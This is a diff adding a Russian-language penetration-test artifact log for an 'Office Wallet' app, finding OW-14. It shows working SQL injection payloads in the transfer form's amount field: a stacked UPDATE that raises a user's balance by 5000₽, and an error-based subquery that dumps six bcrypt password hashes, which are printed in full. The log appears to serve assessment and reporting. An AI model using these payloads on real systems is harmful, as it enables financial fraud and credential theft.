@@ -1,0 +1,44 @@
+OFFICE WALLET · АРТЕФАКТ ПО РЕЕСТРУ
+################################################################################################
+# OW-14
+################################################################################################
+--- проверка 1/2 ---
+== 2. OW-14: SQL-инъекция в сумме: запись в базу мимо всего кода ==
+    · Поле amount_rub не парсится как число — и сервер выполняет его как SQL-запрос
+    · (handlers_money.go:172-180). lib/pq при Exec без параметров гоняет все команды
+    · подряд, поэтому в форму перевода вставляется любая правка в базе: балансы,
+    · роли, пароли, статусы. Ни одна проверка приложения между нами и базой не стоит.
+    → SQL SELECT balance_kop FROM users WHERE login='ivanov';
+    ← psql 189441500
+    → POST /transfer/new  recipient=petrova amount_rub=1;UPDATE users SET balance_kop=balance_kop+500000 WHERE id=1;--
+    ← HTTP 200  <!DOCTYPE html> <html lang="ru"> <head>   <meta charset="utf-8">   <meta name="viewport" content="width=device-width, initial-scale=1">   <title>Перевод · Office Wallet</title>   <link rel="preconnect" href="https://fonts.googleapis.com"> ...
+    → SQL SELECT balance_kop FROM users WHERE login='ivanov';
+    ← psql 189941500
+    ┌─ АРТЕФАКТ · OW-14 · SQL-инъекция изменила баланс напрямую
+    │ users.login=ivanov  balance_kop: 189441500 → 189941500 (дельта +500000 коп)
+    │ Запрос приложения не проверял и не вычислял эту прибавку.
+    └─
+[+] баланс ivanov увеличен на 5000₽ через SQL-инъекцию
+    · А если подзапрос вернёт строку — приведение к bigint упадёт, и текст ошибки
+    · с содержимым печатается прямо в форме. На этом же месте читаются все хеши
+    · (см. stage_data.py, шаг 3).
+
+--- проверка 2/2 ---
+== 3. OW-14: дамп всех хешей паролей через SQL-инъекцию ==
+    · Тот же инъекционный пункт в сумме перевода (handlers_money.go:172-180), но
+    · для чтения: подзапрос возвращает строку, приведение к bigint падает, и текст
+    · ошибки с содержимым печатается прямо в форме. Шесть логинов с bcrypt-хешами
+    · выезжают без каких-либо прав — только рабочая учётка.
+    → POST /transfer/new  amount_rub=(SELECT string_agg(login||password_hash) FROM users)
+    ← HTTP 200  <!DOCTYPE html> <html lang="ru"> <head>   <meta charset="utf-8">   <meta name="viewport" content="width=device-width, initial-scale=1">   <title>Перевод · Office Wallet</title>   <link rel="preconnect" href="https://fonts.googleapis.com"> ...
+    "kassa=$2a$10$Zssjo8K34d6BwzSaBwQ/IuwnAxvmun.Mcb8Qfa/Olpbru6qB2/R4S
+    buch=$2a$10$k2hQU0/WUG56ehd238qLE.vYvd8aynYmHmAGCEFNfj3cUgueODZYy
+    adminw=$2a$10$.WcgUxFiEZL4aYQrYr5bLun2/lMFs9Gifu4FENX2Z5AWs1dWOPy0u
+    sidorov=$2a$10$m.GFGJUh6MIMPjuXqqUG6OlDSVgLYED4vUea1VbEvQKSUnxsTtzTG
+    ivanov=$2a$10$DQdYa8ulSNI7ufNE7g.wIOwauAGuRjefvh4HpI6l5.yBULozjV9uy
+    petrova=$2a$10$3yRGTpVXg0YsQZZy7iVH4.CZu/fQwEjG2au0j9ZHnqc8oOZNL0xeS"
+    ┌─ АРТЕФАКТ · OW-14 · чтение данных через SQL error
+    │ POST /transfer/new с SELECT по users → HTTP 200
+    │ из ответа извлечены bcrypt-хеши (6): "kassa=$2a$10$Zssjo8K34d, buch=$2a$10$k2hQU0/WUG56, adminw=$2a$10$.WcgUxFiEZ, sidorov=$2a$10$m.GFGJUh6
+    └─
+[+] хеши получены (6 шт.)
